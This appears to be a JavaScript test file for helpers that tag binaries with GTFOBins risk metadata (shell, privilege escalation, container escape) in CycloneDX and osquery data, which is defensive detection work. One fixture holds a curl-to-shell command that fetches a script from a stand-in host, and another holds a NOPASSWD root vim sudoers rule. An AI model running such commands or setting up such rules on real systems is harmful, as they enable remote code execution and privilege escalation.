import { strict as assert } from "node:assert";

import { describe, it } from "poku";

import {
  createGtfoBinsProperties,
  createGtfoBinsPropertiesFromRow,
  getGtfoBinsMetadata,
} from "./gtfobins.js";

describe("gtfobins helpers", () => {
  it("returns metadata for exact GTFOBins matches", () => {
    const metadata = getGtfoBinsMetadata("bash");
    assert.ok(metadata);
    assert.strictEqual(metadata.canonicalName, "bash");
    assert.ok(metadata.functions.includes("shell"));
    assert.ok(metadata.contexts.includes("suid"));
    assert.ok(metadata.riskTags.includes("privilege-escalation"));
    assert.ok(metadata.riskTags.includes("lateral-movement"));
  });

  it("resolves versioned aliases conservatively", () => {
    const metadata = getGtfoBinsMetadata("python3.12");
    assert.ok(metadata);
    assert.strictEqual(metadata.canonicalName, "python");
    assert.strictEqual(metadata.matchSource, "alias");
    assert.ok(metadata.functions.includes("shell"));
  });

  it("resolves symlink targets when the basename is not indexed", () => {
    const metadata = getGtfoBinsMetadata("sh", "busybox");
    assert.ok(metadata);
    assert.strictEqual(metadata.canonicalName, "busybox");
    assert.strictEqual(metadata.matchSource, "symlink");
    assert.ok(metadata.riskTags.includes("lateral-movement"));
  });

  it("emits stable CycloneDX properties for matched binaries", () => {
    const properties = createGtfoBinsProperties("docker");
    const propertyMap = Object.fromEntries(
      properties.map((property) => [property.name, property.value]),
    );
    assert.strictEqual(propertyMap["cdx:gtfobins:matched"], "true");
    assert.strictEqual(propertyMap["cdx:gtfobins:name"], "docker");
    assert.ok(propertyMap["cdx:gtfobins:functions"].includes("shell"));
    assert.ok(
      propertyMap["cdx:gtfobins:riskTags"].includes("container-escape"),
    );
    assert.ok(
      propertyMap["cdx:gtfobins:reference"].endsWith("/gtfobins/docker/"),
    );
  });

  it("derives GTFOBins properties from live Linux osquery rows", () => {
    const properties = createGtfoBinsPropertiesFromRow("sudo_executions", {
      path: "/usr/bin/bash",
      cmdline: "bash -c 'curl https://example.invalid/p.sh | sh'",
      parent_cmdline: "sudo bash -c payload",
    });
    const propertyMap = Object.fromEntries(
      properties.map((property) => [property.name, property.value]),
    );
    assert.strictEqual(propertyMap["cdx:gtfobins:matched"], "true");
    assert.ok(propertyMap["cdx:gtfobins:names"].includes("bash"));
    assert.ok(propertyMap["cdx:gtfobins:functions"].includes("shell"));
    assert.ok(
      propertyMap["cdx:gtfobins:queryCategory"].includes("sudo_executions"),
    );
    assert.ok(propertyMap["cdx:gtfobins:matchFields"].includes("path"));
    assert.ok(propertyMap["cdx:gtfobins:matchFields"].includes("cmdline"));
  });
});

describe("createGtfoBinsPropertiesFromRow() for accounts", () => {
  it("does not take an account named after a program for that program", () => {
    for (const category of [
      "users_snapshot",
      "logged_in_users_snapshot",
      "authorized_keys_snapshot",
    ]) {
      assert.deepEqual(
        createGtfoBinsPropertiesFromRow(category, {
          name: "node",
          description: "node user",
          directory: "/home/node",
        }),
        [],
        category,
      );
    }
  });

  it("still matches the program a process or sudo rule runs", () => {
    assert.ok(
      createGtfoBinsPropertiesFromRow("processes", {
        name: "node",
        path: "/usr/local/bin/node",
      }).some((p) => p.name === "cdx:gtfobins:matched"),
    );
    assert.ok(
      createGtfoBinsPropertiesFromRow("sudoers_snapshot", {
        name: "deploy",
        description: "deploy ALL=(root) NOPASSWD: /usr/bin/vim",
      }).some((p) => p.name === "cdx:gtfobins:matched"),
    );
  });
});
